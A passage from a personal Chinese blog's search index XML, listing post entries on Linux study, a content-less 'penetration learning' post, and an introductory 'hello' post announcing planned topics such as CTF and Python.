size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux1/202201150952192.jpg" alt="hello">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透学习</title>
      <link href="/posts/myh10001.html"/>
      <url>/posts/myh10001.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/posts/myh10000.html"/>
      <url>/posts/myh10000.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!</p><p>大概更新的学习内容会有CTF，渗透，机器学习，python，Java的相关知识，期待您的来访~</p><hr><img src="/images/1.png" alt="hello" style="zoom:55%;">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
